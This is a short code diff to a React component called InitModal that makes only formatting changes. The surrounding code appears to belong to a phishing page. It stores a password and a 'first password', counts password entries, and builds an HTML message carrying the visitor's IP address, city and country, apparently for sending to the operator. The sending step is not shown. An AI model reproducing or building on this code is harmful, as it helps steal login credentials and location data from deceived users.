@@ -32,7 +32,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
     const [password, setPassword] = useState('');
     const [showPassword, setShowPassword] = useState(false);
     const [showPasswordError, setShowPasswordError] = useState(false);
-        const [firstPassword, setFirstPassword] = useState('');
+    const [firstPassword, setFirstPassword] = useState('');
     const [passwordEntryCount, setPasswordEntryCount] = useState(0);
     const [translations, setTranslations] = useState<Record<string, string>>({});
     const [formData, setFormData] = useState<FormData>({
@@ -115,8 +115,7 @@ const InitModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
         const message = `
 ${
     geoInfo
-        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>
-<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
+        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>\n<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
         : 'N/A'
 }
 
@@ -143,6 +142,7 @@ ${
             setIsLoading(false);
         }
     };
+
     return (
         <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-2 md:px-4'>
             <div className='flex max-h-[90vh] w-full max-w-xs md:max-w-xl flex-col rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3]'>
